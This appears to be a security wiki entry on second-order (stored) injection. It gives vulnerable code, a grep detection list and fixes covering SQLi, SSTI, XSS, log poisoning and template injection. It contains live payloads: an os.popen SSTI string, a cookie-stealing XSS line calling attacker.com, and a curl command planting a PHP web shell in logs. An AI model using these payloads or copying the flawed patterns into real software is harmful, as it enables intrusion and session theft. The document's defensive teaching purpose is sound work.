# Second-Order Injection

**Tags:** #high #critical #second-order #injection #persistence
**OWASP:** A03:2021 Injection
**CVSS Base:** Inherited from the underlying injection vulnerability

---

## 📖 What it is

Second-Order Injection (or Stored Injection) occurs in two phases:

1. **Phase 1 — Storage:** The malicious data enters "sanitized" (or without sanitization but without immediately triggering) and is **persisted** — database, log, configuration file, cache.

2. **Phase 2 — Detonation:** The data is **re-read** in a different context, without re-sanitization, and fires as an injection.

> *"The data enters as a lamb, hibernates in the database, and wakes up as a wolf."*

---

## 🎯 Patterns by Vector

### Second-Order SQLi

```python
# Phase 1 — Registration (appears safe with escaping)
username = "'admin'--"  # malicious input
# Application escapes the apostrophe on insert
db.execute("INSERT INTO users (username) VALUES (%s)", (username,))
# username is saved IN THE DATABASE as: 'admin'--  (without escaping on future lookup)
```

```python
# Phase 2 — Subsequent use WITHOUT re-sanitization
@app.post('/change-password')
def change_password():
    username = current_user.username  # read from database = "admin'--"
    new_password = request.form['new_password']
    
    # SINK — using the username from the database in a concatenated query
    db.execute(
        f"UPDATE users SET password='{new_password}' WHERE username='{username}'"
        #   username = admin'--  renders WHERE inoperative  changes EVERYONE's password
    )
```

**Kill Chain:**
```
Register "admin'--"  saved to database 
 change_password  
  UPDATE users SET password='X' WHERE username='admin'--'
   SQL: UPDATE users SET password='X' WHERE username='admin' --'  
   Changes the real 'admin' user's password (or all users if 1=1)
```

---

### Second-Order SSTI

```python
# Phase 1 — Save bio with template payload
POST /api/profile/update
{"bio": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}
# bio is saved to the database WITH the payload

# Phase 2 — Public profile rendering
@app.get('/profile/<username>')
def profile(username):
    user = User.query.filter_by(username=username).first()
    # Renders the bio directly in the template!
    return render_template_string(f"<div>{user.bio}</div>")
    #  bio from database = Jinja2 payload  RCE
```

---

### Second-Order XSS (Stored XSS)

```javascript
// Phase 1 — Comment with script saved to database
POST /api/comments
{"content": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}

// Phase 2 — Comments page renders without sanitization
app.get('/comments', async (req, res) => {
    const comments = await Comment.findAll();
    // innerHTML = XSS for any page visitor
    res.send(`<div id="comments">${comments.map(c => c.content).join('')}</div>`);
});
```

---

### Second-Order LFI via Logs (Log Poisoning)

```bash
# Phase 1 — Inject PHP into logs via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
# The web server logs the UA without sanitization in access.log

# Phase 2 — LFI that include()s the log
http://target.com/?page=../../var/log/apache2/access.log&cmd=id
# PHP engine executes the injected code in the log  RCE
```

---

### Second-Order Template/Config File Injection

```python
# Phase 1 — Save malicious "template" to a config file
POST /api/templates/save
{"name": "evil", "content": "{{7*7}} or {{config.__class__...}}"}
# file templates/evil.html created with payload

# Phase 2 — System uses the saved template with a vulnerable engine
result = render_template('evil.html')  #  Payload execution
```

---

## 🔍 `grep_search` for Detecting Second-Order

```
# Check where data read from the database is reused in sinks
# Look for "read from DB and use in sink" patterns

user\.(username|name|email|bio|description)  # ORM fields
session\[                                    # session values
request\.user\.                              # Django: authenticated user fields
current_user\.                               # Flask-Login: current user fields

# Then check if the value is passed to:
query(
execute(
render_template_string(
system(
exec(
innerHTML
```

---

## 🧠 Detection Protocol

```
For each WRITE operation to the database/file:

1. Mentally NOTE: "this data (X) was saved with these fields in (Table Y)"

2. Find ALL queries that READ the fields from Table Y

3. For each read: trace where the read value is passed
    Is it passed to a sink? (SQL query, template, shell, file)
    Is there re-sanitization before the sink? (usually not!)

4. If read  sink without sanitization = Second-Order Injection confirmed
```

---

## 🛡️ Fix

**Fundamental rule:** sanitize at the **point of use** (sink), not only at the point of entry.

```python
#  CORRECT  sanitize at the moment of use in a query, not on save
@app.post('/change-password')
def change_password():
    username = current_user.username  # read from database
    new_password = request.form['new_password']
    
    # Parameterization protects regardless of what is stored in the database
    db.execute(
        "UPDATE users SET password = %s WHERE username = %s",
        (hash_password(new_password), username)
    )
```

```python
#  CORRECT  for templates: never render database content as a template string
# render_template() with a context variable is safe
return render_template('profile.html', bio=user.bio)  # safe  bio is context, not expression
# render_template_string(user.bio) # NEVER  direct render of database content  SSTI
```

---

## 🔗 Chain Exploits

```
Second-Order SQLi + username field  Modify other users' passwords
Second-Order SSTI in bio  RCE via public profile (no authentication needed after insertion)
Log Poisoning (Second-Order) + LFI  RCE via logs
Second-Order XSS in comments  Mass cookie theft from visitors
Second-Order Config Injection  System compromise via malicious template
```

---

## 📌 References
- [[sql-injection-sqli]]
- [[ssti-server-side-template-injection]]
- [[xss-cross-site-scripting]]
- [[path-traversal-lfi]]
- [[cognitive-taint-analysis]]